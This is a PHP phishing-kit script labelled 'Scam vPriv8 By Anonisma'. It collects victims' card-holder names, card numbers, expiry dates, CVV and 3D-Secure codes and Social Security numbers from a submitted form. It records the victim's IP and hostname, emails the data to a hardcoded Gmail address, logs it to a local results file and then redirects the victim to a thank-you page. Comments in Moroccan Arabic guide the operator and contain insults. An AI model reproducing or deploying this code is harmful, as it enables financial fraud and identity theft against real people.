<?php

//Anonisma ...

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------+|--------------------------|+--------------|\n";
$message .= "|----------+|Scam vPriv8 By Anonisma C/V/V |+--------------|\n"; // Tbadal by Anonisma rak machi rajl o machi spammer Noob a wld l9a7ba Noob kbiiiiir 9ad khroztak y7r9 jad din babak lkalb .
$message .= "|----------+|--------------------------|+--------------|\n";
$message .= "|HOLD      : ".$_POST['Anonisma13']."\n";
$message .= "|NUMBR     : ".$_POST['Anonisma14']."\n";
$message .= "|DAT EXP   : ".$_POST['Anonisma15']." / ".$_POST['Anonisma16']."\n";
$message .= "|C/V/V     : ".$_POST['Anonisma17']."\n";
$message .= "|3D/SORT   : ".$_POST['Anonisma18']." / ".$_POST['19']."\n";
$message .= "|S/S/N       : ".$_POST['Anonisma20']." / ".$_POST['Anonisma21']." / ".$_POST['Anonisma22']."\n"; 
$message .= "|----------+|--------------------------|+--------------|\n";
$message .= "|----------+|Informacón de la víctima .|+--------------|\n";  // chof ! sma3 ! tbon mok kaykhl3 !... azaml ila laghamtiha machi rajl wald na3ja .
$message .= "|----------+|--------------------------|+--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|Scam vPriv8  by Anonisma|--------------|\n";
$send = "yazidanjar@Gmail.com  ,  ";   // <=== Dir 2 email wa7d Hotmail o wa7d Yahou wla Gmail , dir 2 ach khsarti bach ta yla waslat khawya fwa7d fflakhor yji 3amra                                               
$subject = "~ vPriv8 Nuevos Resultados Anonisma /CVV/3D/ ~| $ip";

mail("$send", "$subject", $message);   

$f = fopen("./resultados.txt", "a");  // ila waslat chi haja khawya dkhol : ./email/resultados.txt ===> tal9a result maktouba
fwrite($f, $message);

?>

<html>
<script language="javascript">
var page = "../thanks.php?"          
top.location = page;
</script> 
</html>